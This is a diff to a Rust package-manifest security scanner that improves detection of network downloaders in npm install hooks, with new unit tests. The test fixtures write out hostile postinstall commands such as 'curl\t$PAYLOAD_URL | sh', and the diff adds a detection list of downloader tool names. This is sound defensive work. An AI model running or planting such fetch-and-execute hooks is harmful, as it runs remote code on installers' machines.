@@ -14,6 +14,8 @@ use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestrator
 
 use super::NPM_INSTALL_HOOKS;
 
+const INSTALL_HOOK_NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+
 pub(crate) fn analyze_package_json(
     service: &ArtifactOrchestratorService,
     path: &Path,
@@ -195,16 +197,44 @@ fn package_json_install_hook_is_risky(command: &str) -> bool {
 
 fn package_json_install_hook_has_network(command: &str) -> bool {
     let lower_command = command.to_ascii_lowercase();
-    [
-        "curl ",
-        "wget ",
-        "http://",
-        "https://",
-        "invoke-webrequest",
-        "iwr ",
-    ]
-    .iter()
-    .any(|needle| lower_command.contains(needle))
+    lower_command.lines().any(|line| {
+        INSTALL_HOOK_NETWORK_COMMAND_TOKENS
+            .iter()
+            .any(|token| command_token_with_boundary(line, token))
+    }) || lower_command.contains("http://")
+        || lower_command.contains("https://")
+}
+
+fn command_token_with_boundary(line: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = line[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let before = if abs_pos > 0 {
+            line.as_bytes().get(abs_pos - 1)
+        } else {
+            None
+        };
+        let left_ok = before.is_none()
+            || matches!(
+                before,
+                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
+            );
+        let after = line.get(token_end..).unwrap_or("");
+        let right_ok = after.is_empty()
+            || after.starts_with(' ')
+            || after.starts_with('\t')
+            || after.starts_with('|')
+            || after.starts_with(';')
+            || after.starts_with('&')
+            || after.starts_with('>')
+            || after.starts_with('<');
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
 }
 
 /// Whether a `package.json` dependency version specifier is anything
@@ -522,10 +552,47 @@ mod tests {
         assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
     }
 
+    /// # Contract
+    ///
+    /// Install-hook network command detection is token-boundary aware.
+    /// Tab-separated and absolute-path downloader invocations with
+    /// variable-sourced URLs still carry network behavior.
+    #[test]
+    fn package_json_capabilities_adds_network_for_boundary_download_hook() {
+        for command in [
+            "curl\t$PAYLOAD_URL | sh",
+            "/usr/bin/wget\t$PAYLOAD_URL -O payload.sh",
+            "iwr\t$PAYLOAD_URL -OutFile payload.ps1",
+        ] {
+            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
+            let caps = package_json_capabilities(&manifest);
+
+            assert!(
+                capability_present(&caps, ArtifactCapability::NetworkAccess),
+                "boundary-separated downloader must raise NetworkAccess for {command:?}; got {caps:?}",
+            );
+        }
+    }
+
     /// Contract: a plain install hook is execution, not network access.
     #[test]
     fn package_json_capabilities_skips_network_for_plain_install_hook() {
         let manifest = r#"{"name":"x","scripts":{"postinstall":"node bootstrap.js"}}"#;
+
+        let caps = package_json_capabilities(manifest);
+
+        assert!(!capability_present(
+            &caps,
+            ArtifactCapability::NetworkAccess
+        ));
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Downloader matching must not fire on command-name substrings.
+    #[test]
+    fn package_json_capabilities_rejects_download_command_substrings() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"mycurl\t$PAYLOAD_URL"}}"#;
 
         let caps = package_json_capabilities(manifest);
 
@@ -550,6 +617,20 @@ mod tests {
         ));
     }
 
+    /// # Contract
+    ///
+    /// Variable-sourced downloader hooks do not expose a literal URL, but
+    /// they still create a remote-resource Downloads edge for taint and
+    /// capability-combo analysis.
+    #[test]
+    fn package_json_relations_records_remote_resource_for_boundary_download_hook() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;
+
+        let links = package_json_relations(manifest);
+
+        assert!(download_relation_target_present(&links, "remote-resource"));
+    }
+
     /// Contract: plain install hooks do not invent Downloads edges.
     #[test]
     fn package_json_relations_skips_download_for_plain_install_hook() {
@@ -560,6 +641,42 @@ mod tests {
         assert!(!links
             .iter()
             .any(|link| matches!(link.relation, ArtifactRelation::Downloads)));
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Lookalike downloader command names must not invent Downloads edges.
+    #[test]
+    fn package_json_relations_rejects_download_command_substrings() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"mycurl\t$PAYLOAD_URL"}}"#;
+
+        let links = package_json_relations(manifest);
+
+        assert!(!links
+            .iter()
+            .any(|link| matches!(link.relation, ArtifactRelation::Downloads)));
+    }
+
+    /// # Contract
+    ///
+    /// A variable-sourced downloader in an install hook is risky even when
+    /// the command does not contain a literal URL.
+    #[test]
+    fn analyze_package_json_marks_boundary_download_hook_risky() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;
+        let path = std::path::Path::new("/pkg/package.json");
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_package_json(&service, path, manifest, &[]);
+
+        let install_hook_finding = findings
+            .iter()
+            .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
+            .expect("postinstall hook must raise an install-hook finding");
+        assert_eq!(install_hook_finding.severity, Severity::Medium);
+        assert_eq!(
+            install_hook_finding.recommended_action,
+            RecommendedAction::RequireApproval,
+        );
     }
 
     /// Contract: a `bin` field that is whitespace-only is a no-op for npm
